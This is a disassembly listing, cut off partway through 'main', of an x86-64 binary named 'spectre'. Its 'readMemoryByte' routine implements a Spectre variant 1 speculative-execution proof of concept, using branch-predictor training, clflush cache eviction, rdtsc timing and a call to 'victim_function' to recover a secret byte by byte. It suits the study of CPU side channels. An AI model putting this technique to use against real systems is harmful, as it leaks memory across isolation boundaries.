
spectre:     file format elf64-x86-64


Disassembly of section .interp:

0000000000400238 <.interp>:
  400238:	2f                   	(bad)  
  400239:	6c                   	insb   (%dx),%es:(%rdi)
  40023a:	69 62 36 34 2f 6c 64 	imul   $0x646c2f34,0x36(%rdx),%esp
  400241:	2d 6c 69 6e 75       	sub    $0x756e696c,%eax
  400246:	78 2d                	js     400275 <_init-0x1eb>
  400248:	78 38                	js     400282 <_init-0x1de>
  40024a:	36 2d 36 34 2e 73    	ss sub $0x732e3436,%eax
  400250:	6f                   	outsl  %ds:(%rsi),(%dx)
  400251:	2e 32 00             	xor    %cs:(%rax),%al

Disassembly of section .note.ABI-tag:

0000000000400254 <.note.ABI-tag>:
  400254:	04 00                	add    $0x0,%al
  400256:	00 00                	add    %al,(%rax)
  400258:	10 00                	adc    %al,(%rax)
  40025a:	00 00                	add    %al,(%rax)
  40025c:	01 00                	add    %eax,(%rax)
  40025e:	00 00                	add    %al,(%rax)
  400260:	47                   	rex.RXB
  400261:	4e 55                	rex.WRX push %rbp
  400263:	00 00                	add    %al,(%rax)
  400265:	00 00                	add    %al,(%rax)
  400267:	00 02                	add    %al,(%rdx)
  400269:	00 00                	add    %al,(%rax)
  40026b:	00 06                	add    %al,(%rsi)
  40026d:	00 00                	add    %al,(%rax)
  40026f:	00 20                	add    %ah,(%rax)
  400271:	00 00                	add    %al,(%rax)
	...

Disassembly of section .note.gnu.build-id:

0000000000400274 <.note.gnu.build-id>:
  400274:	04 00                	add    $0x0,%al
  400276:	00 00                	add    %al,(%rax)
  400278:	14 00                	adc    $0x0,%al
  40027a:	00 00                	add    %al,(%rax)
  40027c:	03 00                	add    (%rax),%eax
  40027e:	00 00                	add    %al,(%rax)
  400280:	47                   	rex.RXB
  400281:	4e 55                	rex.WRX push %rbp
  400283:	00 77 6a             	add    %dh,0x6a(%rdi)
  400286:	ae                   	scas   %es:(%rdi),%al
  400287:	29 77 93             	sub    %esi,-0x6d(%rdi)
  40028a:	e4 b7                	in     $0xb7,%al
  40028c:	a9 0b 5c 8f 52       	test   $0x528f5c0b,%eax
  400291:	06                   	(bad)  
  400292:	31 ad 29 7f 4d 8d    	xor    %ebp,-0x72b280d7(%rbp)

Disassembly of section .gnu.hash:

0000000000400298 <.gnu.hash>:
  400298:	01 00                	add    %eax,(%rax)
  40029a:	00 00                	add    %al,(%rax)
  40029c:	01 00                	add    %eax,(%rax)
  40029e:	00 00                	add    %al,(%rax)
  4002a0:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .dynsym:

00000000004002b8 <.dynsym>:
	...
  4002d0:	1b 00                	sbb    (%rax),%eax
  4002d2:	00 00                	add    %al,(%rax)
  4002d4:	12 00                	adc    (%rax),%al
	...
  4002e6:	00 00                	add    %al,(%rax)
  4002e8:	23 00                	and    (%rax),%eax
  4002ea:	00 00                	add    %al,(%rax)
  4002ec:	12 00                	adc    (%rax),%al
	...
  4002fe:	00 00                	add    %al,(%rax)
  400300:	2a 00                	sub    (%rax),%al
  400302:	00 00                	add    %al,(%rax)
  400304:	12 00                	adc    (%rax),%al
	...
  400316:	00 00                	add    %al,(%rax)
  400318:	3c 00                	cmp    $0x0,%al
  40031a:	00 00                	add    %al,(%rax)
  40031c:	20 00                	and    %al,(%rax)
	...
  40032e:	00 00                	add    %al,(%rax)
  400330:	0b 00                	or     (%rax),%eax
  400332:	00 00                	add    %al,(%rax)
  400334:	12 00                	adc    (%rax),%al
	...

Disassembly of section .dynstr:

0000000000400348 <.dynstr>:
  400348:	00 6c 69 62          	add    %ch,0x62(%rcx,%rbp,2)
  40034c:	63 2e                	movslq (%rsi),%ebp
  40034e:	73 6f                	jae    4003bf <_init-0xa1>
  400350:	2e 36 00 5f 5f       	cs add %bl,%ss:0x5f(%rdi)
  400355:	69 73 6f 63 39 39 5f 	imul   $0x5f393963,0x6f(%rbx),%esi
  40035c:	73 73                	jae    4003d1 <_init-0x8f>
  40035e:	63 61 6e             	movslq 0x6e(%rcx),%esp
  400361:	66 00 70 75          	data16 add %dh,0x75(%rax)
  400365:	74 63                	je     4003ca <_init-0x96>
  400367:	68 61 72 00 70       	pushq  $0x70007261
  40036c:	72 69                	jb     4003d7 <_init-0x89>
  40036e:	6e                   	outsb  %ds:(%rsi),(%dx)
  40036f:	74 66                	je     4003d7 <_init-0x89>
  400371:	00 5f 5f             	add    %bl,0x5f(%rdi)
  400374:	6c                   	insb   (%dx),%es:(%rdi)
  400375:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%rdx),%esp
  40037c:	72 74                	jb     4003f2 <_init-0x6e>
  40037e:	5f                   	pop    %rdi
  40037f:	6d                   	insl   (%dx),%es:(%rdi)
  400380:	61                   	(bad)  
  400381:	69 6e 00 5f 5f 67 6d 	imul   $0x6d675f5f,0x0(%rsi),%ebp
  400388:	6f                   	outsl  %ds:(%rsi),(%dx)
  400389:	6e                   	outsb  %ds:(%rsi),(%dx)
  40038a:	5f                   	pop    %rdi
  40038b:	73 74                	jae    400401 <_init-0x5f>
  40038d:	61                   	(bad)  
  40038e:	72 74                	jb     400404 <_init-0x5c>
  400390:	5f                   	pop    %rdi
  400391:	5f                   	pop    %rdi
  400392:	00 47 4c             	add    %al,0x4c(%rdi)
  400395:	49                   	rex.WB
  400396:	42                   	rex.X
  400397:	43 5f                	rex.XB pop %r15
  400399:	32 2e                	xor    (%rsi),%ch
  40039b:	37                   	(bad)  
  40039c:	00 47 4c             	add    %al,0x4c(%rdi)
  40039f:	49                   	rex.WB
  4003a0:	42                   	rex.X
  4003a1:	43 5f                	rex.XB pop %r15
  4003a3:	32 2e                	xor    (%rsi),%ch
  4003a5:	32 2e                	xor    (%rsi),%ch
  4003a7:	35                   	.byte 0x35
	...

Disassembly of section .gnu.version:

00000000004003aa <.gnu.version>:
  4003aa:	00 00                	add    %al,(%rax)
  4003ac:	02 00                	add    (%rax),%al
  4003ae:	02 00                	add    (%rax),%al
  4003b0:	02 00                	add    (%rax),%al
  4003b2:	00 00                	add    %al,(%rax)
  4003b4:	03 00                	add    (%rax),%eax

Disassembly of section .gnu.version_r:

00000000004003b8 <.gnu.version_r>:
  4003b8:	01 00                	add    %eax,(%rax)
  4003ba:	02 00                	add    (%rax),%al
  4003bc:	01 00                	add    %eax,(%rax)
  4003be:	00 00                	add    %al,(%rax)
  4003c0:	10 00                	adc    %al,(%rax)
  4003c2:	00 00                	add    %al,(%rax)
  4003c4:	00 00                	add    %al,(%rax)
  4003c6:	00 00                	add    %al,(%rax)
  4003c8:	17                   	(bad)  
  4003c9:	69 69 0d 00 00 03 00 	imul   $0x30000,0xd(%rcx),%ebp
  4003d0:	4b 00 00             	rex.WXB add %al,(%r8)
  4003d3:	00 10                	add    %dl,(%rax)
  4003d5:	00 00                	add    %al,(%rax)
  4003d7:	00 75 1a             	add    %dh,0x1a(%rbp)
  4003da:	69 09 00 00 02 00    	imul   $0x20000,(%rcx),%ecx
  4003e0:	55                   	push   %rbp
  4003e1:	00 00                	add    %al,(%rax)
  4003e3:	00 00                	add    %al,(%rax)
  4003e5:	00 00                	add    %al,(%rax)
	...

Disassembly of section .rela.dyn:

00000000004003e8 <.rela.dyn>:
  4003e8:	f8                   	clc    
  4003e9:	0f 60 00             	punpcklbw (%rax),%mm0
  4003ec:	00 00                	add    %al,(%rax)
  4003ee:	00 00                	add    %al,(%rax)
  4003f0:	06                   	(bad)  
  4003f1:	00 00                	add    %al,(%rax)
  4003f3:	00 04 00             	add    %al,(%rax,%rax,1)
	...

Disassembly of section .rela.plt:

0000000000400400 <.rela.plt>:
  400400:	18 10                	sbb    %dl,(%rax)
  400402:	60                   	(bad)  
  400403:	00 00                	add    %al,(%rax)
  400405:	00 00                	add    %al,(%rax)
  400407:	00 07                	add    %al,(%rdi)
  400409:	00 00                	add    %al,(%rax)
  40040b:	00 01                	add    %al,(%rcx)
	...
  400415:	00 00                	add    %al,(%rax)
  400417:	00 20                	add    %ah,(%rax)
  400419:	10 60 00             	adc    %ah,0x0(%rax)
  40041c:	00 00                	add    %al,(%rax)
  40041e:	00 00                	add    %al,(%rax)
  400420:	07                   	(bad)  
  400421:	00 00                	add    %al,(%rax)
  400423:	00 02                	add    %al,(%rdx)
	...
  40042d:	00 00                	add    %al,(%rax)
  40042f:	00 28                	add    %ch,(%rax)
  400431:	10 60 00             	adc    %ah,0x0(%rax)
  400434:	00 00                	add    %al,(%rax)
  400436:	00 00                	add    %al,(%rax)
  400438:	07                   	(bad)  
  400439:	00 00                	add    %al,(%rax)
  40043b:	00 03                	add    %al,(%rbx)
	...
  400445:	00 00                	add    %al,(%rax)
  400447:	00 30                	add    %dh,(%rax)
  400449:	10 60 00             	adc    %ah,0x0(%rax)
  40044c:	00 00                	add    %al,(%rax)
  40044e:	00 00                	add    %al,(%rax)
  400450:	07                   	(bad)  
  400451:	00 00                	add    %al,(%rax)
  400453:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 400459 <_init-0x7>
  400459:	00 00                	add    %al,(%rax)
  40045b:	00 00                	add    %al,(%rax)
  40045d:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init:

0000000000400460 <_init>:
  400460:	48 83 ec 08          	sub    $0x8,%rsp
  400464:	48 8b 05 8d 0b 20 00 	mov    0x200b8d(%rip),%rax        # 600ff8 <__gmon_start__>
  40046b:	48 85 c0             	test   %rax,%rax
  40046e:	74 05                	je     400475 <_init+0x15>
  400470:	e8 5b 00 00 00       	callq  4004d0 <.plt.got>
  400475:	48 83 c4 08          	add    $0x8,%rsp
  400479:	c3                   	retq   

Disassembly of section .plt:

0000000000400480 <.plt>:
  400480:	ff 35 82 0b 20 00    	pushq  0x200b82(%rip)        # 601008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400486:	ff 25 84 0b 20 00    	jmpq   *0x200b84(%rip)        # 601010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40048c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400490 <putchar@plt>:
  400490:	ff 25 82 0b 20 00    	jmpq   *0x200b82(%rip)        # 601018 <putchar@GLIBC_2.2.5>
  400496:	68 00 00 00 00       	pushq  $0x0
  40049b:	e9 e0 ff ff ff       	jmpq   400480 <.plt>

00000000004004a0 <printf@plt>:
  4004a0:	ff 25 7a 0b 20 00    	jmpq   *0x200b7a(%rip)        # 601020 <printf@GLIBC_2.2.5>
  4004a6:	68 01 00 00 00       	pushq  $0x1
  4004ab:	e9 d0 ff ff ff       	jmpq   400480 <.plt>

00000000004004b0 <__libc_start_main@plt>:
  4004b0:	ff 25 72 0b 20 00    	jmpq   *0x200b72(%rip)        # 601028 <__libc_start_main@GLIBC_2.2.5>
  4004b6:	68 02 00 00 00       	pushq  $0x2
  4004bb:	e9 c0 ff ff ff       	jmpq   400480 <.plt>

00000000004004c0 <__isoc99_sscanf@plt>:
  4004c0:	ff 25 6a 0b 20 00    	jmpq   *0x200b6a(%rip)        # 601030 <__isoc99_sscanf@GLIBC_2.7>
  4004c6:	68 03 00 00 00       	pushq  $0x3
  4004cb:	e9 b0 ff ff ff       	jmpq   400480 <.plt>

Disassembly of section .plt.got:

00000000004004d0 <.plt.got>:
  4004d0:	ff 25 22 0b 20 00    	jmpq   *0x200b22(%rip)        # 600ff8 <__gmon_start__>
  4004d6:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

00000000004004e0 <_start>:
  4004e0:	31 ed                	xor    %ebp,%ebp
  4004e2:	49 89 d1             	mov    %rdx,%r9
  4004e5:	5e                   	pop    %rsi
  4004e6:	48 89 e2             	mov    %rsp,%rdx
  4004e9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  4004ed:	50                   	push   %rax
  4004ee:	54                   	push   %rsp
  4004ef:	49 c7 c0 30 0b 40 00 	mov    $0x400b30,%r8
  4004f6:	48 c7 c1 c0 0a 40 00 	mov    $0x400ac0,%rcx
  4004fd:	48 c7 c7 d0 08 40 00 	mov    $0x4008d0,%rdi
  400504:	e8 a7 ff ff ff       	callq  4004b0 <__libc_start_main@plt>
  400509:	f4                   	hlt    
  40050a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000400510 <deregister_tm_clones>:
  400510:	b8 37 11 60 00       	mov    $0x601137,%eax
  400515:	55                   	push   %rbp
  400516:	48 2d 30 11 60 00    	sub    $0x601130,%rax
  40051c:	48 83 f8 0e          	cmp    $0xe,%rax
  400520:	48 89 e5             	mov    %rsp,%rbp
  400523:	77 02                	ja     400527 <deregister_tm_clones+0x17>
  400525:	5d                   	pop    %rbp
  400526:	c3                   	retq   
  400527:	b8 00 00 00 00       	mov    $0x0,%eax
  40052c:	48 85 c0             	test   %rax,%rax
  40052f:	74 f4                	je     400525 <deregister_tm_clones+0x15>
  400531:	5d                   	pop    %rbp
  400532:	bf 30 11 60 00       	mov    $0x601130,%edi
  400537:	ff e0                	jmpq   *%rax
  400539:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000400540 <register_tm_clones>:
  400540:	b8 30 11 60 00       	mov    $0x601130,%eax
  400545:	55                   	push   %rbp
  400546:	48 2d 30 11 60 00    	sub    $0x601130,%rax
  40054c:	48 c1 f8 03          	sar    $0x3,%rax
  400550:	48 89 e5             	mov    %rsp,%rbp
  400553:	48 89 c2             	mov    %rax,%rdx
  400556:	48 c1 ea 3f          	shr    $0x3f,%rdx
  40055a:	48 01 d0             	add    %rdx,%rax
  40055d:	48 d1 f8             	sar    %rax
  400560:	75 02                	jne    400564 <register_tm_clones+0x24>
  400562:	5d                   	pop    %rbp
  400563:	c3                   	retq   
  400564:	ba 00 00 00 00       	mov    $0x0,%edx
  400569:	48 85 d2             	test   %rdx,%rdx
  40056c:	74 f4                	je     400562 <register_tm_clones+0x22>
  40056e:	5d                   	pop    %rbp
  40056f:	48 89 c6             	mov    %rax,%rsi
  400572:	bf 30 11 60 00       	mov    $0x601130,%edi
  400577:	ff e2                	jmpq   *%rdx
  400579:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000400580 <__do_global_dtors_aux>:
  400580:	80 3d b9 0b 20 00 00 	cmpb   $0x0,0x200bb9(%rip)        # 601140 <completed.6355>
  400587:	75 11                	jne    40059a <__do_global_dtors_aux+0x1a>
  400589:	55                   	push   %rbp
  40058a:	48 89 e5             	mov    %rsp,%rbp
  40058d:	e8 7e ff ff ff       	callq  400510 <deregister_tm_clones>
  400592:	5d                   	pop    %rbp
  400593:	c6 05 a6 0b 20 00 01 	movb   $0x1,0x200ba6(%rip)        # 601140 <completed.6355>
  40059a:	f3 c3                	repz retq 
  40059c:	0f 1f 40 00          	nopl   0x0(%rax)

00000000004005a0 <frame_dummy>:
  4005a0:	48 83 3d 78 08 20 00 	cmpq   $0x0,0x200878(%rip)        # 600e20 <__JCR_END__>
  4005a7:	00 
  4005a8:	74 1e                	je     4005c8 <frame_dummy+0x28>
  4005aa:	b8 00 00 00 00       	mov    $0x0,%eax
  4005af:	48 85 c0             	test   %rax,%rax
  4005b2:	74 14                	je     4005c8 <frame_dummy+0x28>
  4005b4:	55                   	push   %rbp
  4005b5:	bf 20 0e 60 00       	mov    $0x600e20,%edi
  4005ba:	48 89 e5             	mov    %rsp,%rbp
  4005bd:	ff d0                	callq  *%rax
  4005bf:	5d                   	pop    %rbp
  4005c0:	e9 7b ff ff ff       	jmpq   400540 <register_tm_clones>
  4005c5:	0f 1f 00             	nopl   (%rax)
  4005c8:	e9 73 ff ff ff       	jmpq   400540 <register_tm_clones>

00000000004005cd <readMemoryByte>:
  4005cd:	55                   	push   %rbp
  4005ce:	48 89 e5             	mov    %rsp,%rbp
  4005d1:	53                   	push   %rbx
  4005d2:	48 83 ec 78          	sub    $0x78,%rsp
  4005d6:	48 89 7d 98          	mov    %rdi,-0x68(%rbp)
  4005da:	48 89 75 90          	mov    %rsi,-0x70(%rbp)
  4005de:	48 89 55 88          	mov    %rdx,-0x78(%rbp)
  4005e2:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%rbp)
  4005e9:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
  4005f0:	eb 14                	jmp    400606 <readMemoryByte+0x39>
  4005f2:	8b 45 e8             	mov    -0x18(%rbp),%eax
  4005f5:	48 98                	cltq   
  4005f7:	c7 04 85 60 11 60 00 	movl   $0x0,0x601160(,%rax,4)
  4005fe:	00 00 00 00 
  400602:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
  400606:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
  40060d:	7e e3                	jle    4005f2 <readMemoryByte+0x25>
  40060f:	c7 45 ec e7 03 00 00 	movl   $0x3e7,-0x14(%rbp)
  400616:	e9 55 02 00 00       	jmpq   400870 <readMemoryByte+0x2a3>
  40061b:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
  400622:	eb 1d                	jmp    400641 <readMemoryByte+0x74>
  400624:	8b 45 e8             	mov    -0x18(%rbp),%eax
  400627:	c1 e0 09             	shl    $0x9,%eax
  40062a:	48 98                	cltq   
  40062c:	48 05 c0 15 60 00    	add    $0x6015c0,%rax
  400632:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  400636:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  40063a:	0f ae 38             	clflush (%rax)
  40063d:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
  400641:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
  400648:	7e da                	jle    400624 <readMemoryByte+0x57>
  40064a:	8b 45 ec             	mov    -0x14(%rbp),%eax
  40064d:	8b 0d 0d 0a 20 00    	mov    0x200a0d(%rip),%ecx        # 601060 <array1_size>
  400653:	ba 00 00 00 00       	mov    $0x0,%edx
  400658:	f7 f1                	div    %ecx
  40065a:	89 d0                	mov    %edx,%eax
  40065c:	89 c0                	mov    %eax,%eax
  40065e:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  400662:	c7 45 e4 1d 00 00 00 	movl   $0x1d,-0x1c(%rbp)
  400669:	e9 88 00 00 00       	jmpq   4006f6 <readMemoryByte+0x129>
  40066e:	48 c7 45 a8 60 10 60 	movq   $0x601060,-0x58(%rbp)
  400675:	00 
  400676:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  40067a:	0f ae 38             	clflush (%rax)
  40067d:	c7 45 a4 00 00 00 00 	movl   $0x0,-0x5c(%rbp)
  400684:	eb 09                	jmp    40068f <readMemoryByte+0xc2>
  400686:	8b 45 a4             	mov    -0x5c(%rbp),%eax
  400689:	83 c0 01             	add    $0x1,%eax
  40068c:	89 45 a4             	mov    %eax,-0x5c(%rbp)
  40068f:	8b 45 a4             	mov    -0x5c(%rbp),%eax
  400692:	83 f8 63             	cmp    $0x63,%eax
  400695:	7e ef                	jle    400686 <readMemoryByte+0xb9>
  400697:	8b 4d e4             	mov    -0x1c(%rbp),%ecx
  40069a:	ba ab aa aa 2a       	mov    $0x2aaaaaab,%edx
  40069f:	89 c8                	mov    %ecx,%eax
  4006a1:	f7 ea                	imul   %edx
  4006a3:	89 c8                	mov    %ecx,%eax
  4006a5:	c1 f8 1f             	sar    $0x1f,%eax
  4006a8:	29 c2                	sub    %eax,%edx
  4006aa:	89 d0                	mov    %edx,%eax
  4006ac:	01 c0                	add    %eax,%eax
  4006ae:	01 d0                	add    %edx,%eax
  4006b0:	01 c0                	add    %eax,%eax
  4006b2:	29 c1                	sub    %eax,%ecx
  4006b4:	89 ca                	mov    %ecx,%edx
  4006b6:	8d 42 ff             	lea    -0x1(%rdx),%eax
  4006b9:	66 b8 00 00          	mov    $0x0,%ax
  4006bd:	48 98                	cltq   
  4006bf:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  4006c3:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4006c7:	48 c1 e8 10          	shr    $0x10,%rax
  4006cb:	48 09 45 c8          	or     %rax,-0x38(%rbp)
  4006cf:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4006d3:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
  4006d7:	48 31 d0             	xor    %rdx,%rax
  4006da:	48 23 45 c8          	and    -0x38(%rbp),%rax
  4006de:	48 33 45 d0          	xor    -0x30(%rbp),%rax
  4006e2:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  4006e6:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4006ea:	48 89 c7             	mov    %rax,%rdi
  4006ed:	e8 88 03 00 00       	callq  400a7a <victim_function>
  4006f2:	83 6d e4 01          	subl   $0x1,-0x1c(%rbp)
  4006f6:	83 7d e4 00          	cmpl   $0x0,-0x1c(%rbp)
  4006fa:	0f 89 6e ff ff ff    	jns    40066e <readMemoryByte+0xa1>
  400700:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
  400707:	e9 96 00 00 00       	jmpq   4007a2 <readMemoryByte+0x1d5>
  40070c:	8b 45 e8             	mov    -0x18(%rbp),%eax
  40070f:	69 c0 a7 00 00 00    	imul   $0xa7,%eax,%eax
  400715:	83 c0 0d             	add    $0xd,%eax
  400718:	25 ff 00 00 00       	and    $0xff,%eax
  40071d:	89 45 c4             	mov    %eax,-0x3c(%rbp)
  400720:	8b 45 c4             	mov    -0x3c(%rbp),%eax
  400723:	c1 e0 09             	shl    $0x9,%eax
  400726:	48 98                	cltq   
  400728:	48 05 c0 15 60 00    	add    $0x6015c0,%rax
  40072e:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  400732:	0f 31                	rdtsc  
  400734:	48 c1 e2 20          	shl    $0x20,%rdx
  400738:	48 09 d0             	or     %rdx,%rax
  40073b:	48 89 c3             	mov    %rax,%rbx
  40073e:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  400742:	0f b6 00             	movzbl (%rax),%eax
  400745:	0f b6 c0             	movzbl %al,%eax
  400748:	89 45 dc             	mov    %eax,-0x24(%rbp)
  40074b:	0f 31                	rdtsc  
  40074d:	48 c1 e2 20          	shl    $0x20,%rdx
  400751:	48 09 d0             	or     %rdx,%rax
  400754:	48 29 d8             	sub    %rbx,%rax
  400757:	48 89 c3             	mov    %rax,%rbx
  40075a:	48 83 fb 50          	cmp    $0x50,%rbx
  40075e:	77 3e                	ja     40079e <readMemoryByte+0x1d1>
  400760:	8b 45 ec             	mov    -0x14(%rbp),%eax
  400763:	8b 0d f7 08 20 00    	mov    0x2008f7(%rip),%ecx        # 601060 <array1_size>
  400769:	ba 00 00 00 00       	mov    $0x0,%edx
  40076e:	f7 f1                	div    %ecx
  400770:	89 d0                	mov    %edx,%eax
  400772:	89 c0                	mov    %eax,%eax
  400774:	0f b6 80 80 10 60 00 	movzbl 0x601080(%rax),%eax
  40077b:	0f b6 c0             	movzbl %al,%eax
  40077e:	3b 45 c4             	cmp    -0x3c(%rbp),%eax
  400781:	74 1b                	je     40079e <readMemoryByte+0x1d1>
  400783:	8b 45 c4             	mov    -0x3c(%rbp),%eax
  400786:	48 98                	cltq   
  400788:	8b 04 85 60 11 60 00 	mov    0x601160(,%rax,4),%eax
  40078f:	8d 50 01             	lea    0x1(%rax),%edx
  400792:	8b 45 c4             	mov    -0x3c(%rbp),%eax
  400795:	48 98                	cltq   
  400797:	89 14 85 60 11 60 00 	mov    %edx,0x601160(,%rax,4)
  40079e:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
  4007a2:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
  4007a9:	0f 8e 5d ff ff ff    	jle    40070c <readMemoryByte+0x13f>
  4007af:	c7 45 e0 ff ff ff ff 	movl   $0xffffffff,-0x20(%rbp)
  4007b6:	8b 45 e0             	mov    -0x20(%rbp),%eax
  4007b9:	89 45 e4             	mov    %eax,-0x1c(%rbp)
  4007bc:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
  4007c3:	eb 5c                	jmp    400821 <readMemoryByte+0x254>
  4007c5:	83 7d e4 00          	cmpl   $0x0,-0x1c(%rbp)
  4007c9:	78 1c                	js     4007e7 <readMemoryByte+0x21a>
  4007cb:	8b 45 e8             	mov    -0x18(%rbp),%eax
  4007ce:	48 98                	cltq   
  4007d0:	8b 14 85 60 11 60 00 	mov    0x601160(,%rax,4),%edx
  4007d7:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  4007da:	48 98                	cltq   
  4007dc:	8b 04 85 60 11 60 00 	mov    0x601160(,%rax,4),%eax
  4007e3:	39 c2                	cmp    %eax,%edx
  4007e5:	7c 0e                	jl     4007f5 <readMemoryByte+0x228>
  4007e7:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  4007ea:	89 45 e0             	mov    %eax,-0x20(%rbp)
  4007ed:	8b 45 e8             	mov    -0x18(%rbp),%eax
  4007f0:	89 45 e4             	mov    %eax,-0x1c(%rbp)
  4007f3:	eb 28                	jmp    40081d <readMemoryByte+0x250>
  4007f5:	83 7d e0 00          	cmpl   $0x0,-0x20(%rbp)
  4007f9:	78 1c                	js     400817 <readMemoryByte+0x24a>
  4007fb:	8b 45 e8             	mov    -0x18(%rbp),%eax
  4007fe:	48 98                	cltq   
  400800:	8b 14 85 60 11 60 00 	mov    0x601160(,%rax,4),%edx
  400807:	8b 45 e0             	mov    -0x20(%rbp),%eax
  40080a:	48 98                	cltq   
  40080c:	8b 04 85 60 11 60 00 	mov    0x601160(,%rax,4),%eax
  400813:	39 c2                	cmp    %eax,%edx
  400815:	7c 06                	jl     40081d <readMemoryByte+0x250>
  400817:	8b 45 e8             	mov    -0x18(%rbp),%eax
  40081a:	89 45 e0             	mov    %eax,-0x20(%rbp)
  40081d:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
  400821:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
  400828:	7e 9b                	jle    4007c5 <readMemoryByte+0x1f8>
  40082a:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  40082d:	48 98                	cltq   
  40082f:	8b 14 85 60 11 60 00 	mov    0x601160(,%rax,4),%edx
  400836:	8b 45 e0             	mov    -0x20(%rbp),%eax
  400839:	48 98                	cltq   
  40083b:	8b 04 85 60 11 60 00 	mov    0x601160(,%rax,4),%eax
  400842:	01 c0                	add    %eax,%eax
  400844:	83 c0 05             	add    $0x5,%eax
  400847:	39 c2                	cmp    %eax,%edx
  400849:	7d 2f                	jge    40087a <readMemoryByte+0x2ad>
  40084b:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  40084e:	48 98                	cltq   
  400850:	8b 04 85 60 11 60 00 	mov    0x601160(,%rax,4),%eax
  400857:	83 f8 02             	cmp    $0x2,%eax
  40085a:	75 10                	jne    40086c <readMemoryByte+0x29f>
  40085c:	8b 45 e0             	mov    -0x20(%rbp),%eax
  40085f:	48 98                	cltq   
  400861:	8b 04 85 60 11 60 00 	mov    0x601160(,%rax,4),%eax
  400868:	85 c0                	test   %eax,%eax
  40086a:	74 0e                	je     40087a <readMemoryByte+0x2ad>
  40086c:	83 6d ec 01          	subl   $0x1,-0x14(%rbp)
  400870:	83 7d ec 00          	cmpl   $0x0,-0x14(%rbp)
  400874:	0f 8f a1 fd ff ff    	jg     40061b <readMemoryByte+0x4e>
  40087a:	8b 05 e0 08 20 00    	mov    0x2008e0(%rip),%eax        # 601160 <results.6548>
  400880:	33 45 dc             	xor    -0x24(%rbp),%eax
  400883:	89 05 d7 08 20 00    	mov    %eax,0x2008d7(%rip)        # 601160 <results.6548>
  400889:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  40088c:	89 c2                	mov    %eax,%edx
  40088e:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  400892:	88 10                	mov    %dl,(%rax)
  400894:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  400897:	48 98                	cltq   
  400899:	8b 14 85 60 11 60 00 	mov    0x601160(,%rax,4),%edx
  4008a0:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  4008a4:	89 10                	mov    %edx,(%rax)
  4008a6:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  4008aa:	48 8d 50 01          	lea    0x1(%rax),%rdx
  4008ae:	8b 45 e0             	mov    -0x20(%rbp),%eax
  4008b1:	88 02                	mov    %al,(%rdx)
  4008b3:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  4008b7:	48 8d 50 04          	lea    0x4(%rax),%rdx
  4008bb:	8b 45 e0             	mov    -0x20(%rbp),%eax
  4008be:	48 98                	cltq   
  4008c0:	8b 04 85 60 11 60 00 	mov    0x601160(,%rax,4),%eax
  4008c7:	89 02                	mov    %eax,(%rdx)
  4008c9:	48 83 c4 78          	add    $0x78,%rsp
  4008cd:	5b                   	pop    %rbx
  4008ce:	5d                   	pop    %rbp
  4008cf:	c3                   	retq   

00000000004008d0 <main>:
  4008d0:	55                   	push   %rbp
  4008d1:	48 89 e5             	mov    %rsp,%rbp
  4008d4:	48 83 ec 40          	sub    $0x40,%rsp
  4008d8:	89 7d cc             	mov    %edi,-0x34(%rbp)
  4008db:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)
  4008df:	48 8b 05 3a 08 20 00 	mov    0x20083a(%rip),%rax        # 601120 <secret_address>
  4008e6:	48 8b 00             	mov    (%rax),%rax
  4008e9:	48 89 c2             	mov    %rax,%rdx
  4008ec:	b8 80 10 60 00       	mov    $0x601080,%eax
  4008f1:	48 29 c2             	sub    %rax,%rdx
  4008f4:	48 89 d0             	mov    %rdx,%rax
  4008f7:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4008fb:	c7 45 dc 28 00 00 00 	movl   $0x28,-0x24(%rbp)
  400902:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
  400909:	eb 10                	jmp    40091b <main+0x4b>
